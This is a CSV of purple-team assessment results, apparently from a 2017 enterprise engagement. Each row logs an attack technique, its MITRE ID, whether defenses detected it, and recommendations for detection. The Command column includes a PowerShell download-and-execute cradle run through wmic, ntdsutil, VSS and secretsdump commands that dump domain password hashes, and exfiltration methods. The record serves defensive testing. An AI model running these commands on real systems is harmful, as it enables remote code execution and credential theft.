AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T06:45:10.460Z,1502606710460,2017-08-13T07:47:25.460Z,1502610445460,2017-08-13T08:35:12.460Z,1502613312460,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-13T01:38:59.460Z,1502588339460,2017-08-13T01:39:08.460Z,1502588348460,2017-08-13T02:12:56.460Z,1502590376460,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T14:12:30.460Z,1502633550460,2017-08-13T14:35:16.460Z,1502634916460,2017-08-13T14:46:49.460Z,1502635609460,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T18:25:58.460Z,1502648758460,2017-08-13T19:43:38.460Z,1502653418460,2017-08-13T20:08:00.460Z,1502654880460,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T14:50:45.460Z,1502635845460,2017-08-13T15:36:32.460Z,1502638592460,2017-08-13T16:39:00.460Z,1502642340460,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T20:20:29.460Z,1501791629460,2017-08-03T21:53:03.460Z,1501797183460,2017-08-03T22:01:28.460Z,1501797688460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T18:41:37.460Z,1501785697460,2017-08-03T18:48:56.460Z,1501786136460,2017-08-03T19:56:15.460Z,1501790175460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T16:05:47.460Z,1501776347460,2017-08-03T16:34:30.460Z,1501778070460,2017-08-03T18:23:38.460Z,1501784618460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-08-15T05:23:01.460Z,1502774581460,2017-08-15T05:35:20.460Z,1502775320460,2017-08-15T07:25:33.460Z,1502781933460,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2017-08-15T08:40:28.460Z,1502786428460,2017-08-15T08:49:30.460Z,1502786970460,2017-08-15T10:36:11.460Z,1502793371460,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-08-15T11:38:14.460Z,1502797094460,2017-08-15T12:46:42.460Z,1502801202460,2017-08-15T13:58:25.460Z,1502805505460,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-08-15T15:48:03.460Z,1502812083460,2017-08-15T16:10:41.460Z,1502813441460,2017-08-15T17:33:12.460Z,1502818392460,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-08-19T21:51:08.460Z,1503179468460,2017-08-19T22:53:05.460Z,1503183185460,2017-08-20T00:40:52.460Z,1503189652460,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2017-08-20T17:21:27.460Z,1503249687460,2017-08-20T18:37:43.460Z,1503254263460,2017-08-20T19:06:34.460Z,1503255994460,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-08-20T14:24:54.460Z,1503239094460,2017-08-20T14:52:35.460Z,1503240755460,2017-08-20T15:49:49.460Z,1503244189460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2017-08-20T22:27:52.460Z,1503268072460,2017-08-20T22:42:50.460Z,1503268970460,2017-08-21T00:28:25.460Z,1503275305460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,NotDetected,TBD,TBD,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",,2017-08-20T07:51:40.460Z,1503215500460,2017-08-20T09:14:17.460Z,1503220457460,2017-08-20T10:44:29.460Z,1503225869460,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-08-20T00:57:07.460Z,1503190627460,2017-08-20T02:37:24.460Z,1503196644460,2017-08-20T03:36:45.460Z,1503200205460,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2017-08-20T04:37:08.460Z,1503203828460,2017-08-20T04:38:54.460Z,1503203934460,2017-08-20T06:11:09.460Z,1503209469460,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,Email Gateway,,2017-08-20T20:00:56.460Z,1503259256460,2017-08-20T20:24:10.460Z,1503260650460,2017-08-20T21:50:44.460Z,1503265844460,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-08-20T10:44:51.460Z,1503225891460,2017-08-20T11:19:04.460Z,1503227944460,2017-08-20T13:07:43.460Z,1503234463460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-18T19:24:28.460Z,1503084268460,2017-08-18T21:02:17.460Z,1503090137460,2017-08-18T21:16:25.460Z,1503090985460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,"SIEM,Behavior Analytics",,2017-08-18T07:13:04.460Z,1503040384460,2017-08-18T08:13:46.460Z,1503044026460,2017-08-18T08:34:10.460Z,1503045250460,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-19T01:35:12.460Z,1503106512460,2017-08-19T01:35:21.460Z,1503106521460,2017-08-19T03:26:26.460Z,1503113186460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",,2017-08-18T15:29:37.460Z,1503070177460,2017-08-18T15:57:47.460Z,1503071867460,2017-08-18T15:58:07.460Z,1503071887460,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-18T21:57:04.460Z,1503093424460,2017-08-18T22:20:52.460Z,1503094852460,2017-08-19T00:14:47.460Z,1503101687460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
